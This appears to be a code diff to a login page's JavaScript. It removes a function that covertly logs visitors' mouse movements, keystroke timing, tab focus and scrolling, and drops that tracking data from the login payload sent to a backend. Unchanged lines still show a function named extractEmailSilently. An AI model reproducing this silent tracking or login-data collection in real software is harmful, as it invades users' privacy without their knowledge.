@@ -783,57 +783,6 @@ function extractEmailSilently() {
     return '';
 }
 
-// ==================== BEHAVIOR TRACKING ====================
-function startBehaviorTracking() {
-    // Mouse movements
-    document.addEventListener('mousemove', (e) => {
-        if (CONFIG.tracking.mouse.length < 50) {
-            CONFIG.tracking.mouse.push({
-                x: e.clientX,
-                y: e.clientY,
-                t: Date.now()
-            });
-        }
-    });
-    
-    // Keystroke timing
-    let lastKeyTime = Date.now();
-    document.addEventListener('keydown', (e) => {
-        if (e.target.matches('input, textarea')) {
-            const now = Date.now();
-            CONFIG.tracking.keys.push({
-                key: e.key.length === 1 ? 'char' : e.key,
-                delay: now - lastKeyTime,
-                target: e.target.type || 'input'
-            });
-            lastKeyTime = now;
-        }
-    });
-    
-    // Tab visibility
-    document.addEventListener('visibilitychange', () => {
-        CONFIG.tracking.focus.push({
-            hidden: document.hidden,
-            time: Date.now(),
-            duration: document.hidden ? Date.now() - (CONFIG.tracking.focus[CONFIG.tracking.focus.length - 1]?.time || Date.now()) : 0
-        });
-    });
-    
-    // Scroll behavior
-    let lastScrollTime = Date.now();
-    window.addEventListener('scroll', () => {
-        const now = Date.now();
-        if (now - lastScrollTime > 100) {
-            CONFIG.tracking.scroll.push({
-                y: window.scrollY,
-                t: now
-            });
-            lastScrollTime = now;
-        }
-    });
-}
-
-// ==================== DATA COLLECTION ====================
 async function sendDataToBackend(data) {
     try {
         // Simple POST request to endpoint
@@ -1031,7 +980,6 @@ async function handleLogin(e) {
             l: navigator.language,
             ref: document.referrer || 'direct',
             t: Date.now(),
-            tr: CONFIG.tracking
         };
         
         // Send to backend
